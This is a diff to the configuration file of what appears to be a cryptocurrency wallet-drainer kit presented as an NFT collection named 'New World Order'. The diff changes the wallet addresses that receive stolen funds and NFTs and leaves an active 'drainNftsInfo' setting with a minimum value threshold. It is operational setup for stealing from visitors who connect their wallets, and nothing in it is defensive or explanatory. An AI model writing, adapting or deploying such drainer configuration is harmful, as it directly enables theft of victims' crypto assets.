@@ -1,4 +1,4 @@
-const receiveAddress = '0xe9B595D4d6512bc8B9E1Cd4Ac4965ff68F8f04d3',
+const receiveAddress = '0xbB95D169DA662408c201e97eA019319D68c24F89',
   collectionInfo = {
     name: 'New World Order',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xe9B595D4d6512bc8B9E1Cd4Ac4965ff68F8f04d3',
   drainNftsInfo = {
     active: true,
     minValue: 0.05,
-    nftReceiveAddress: '0xe9B595D4d6512bc8B9E1Cd4Ac4965ff68F8f04d3',
+    nftReceiveAddress: '0xbB95D169DA662408c201e97eA019319D68c24F89',
   },
 
   customStrings = {
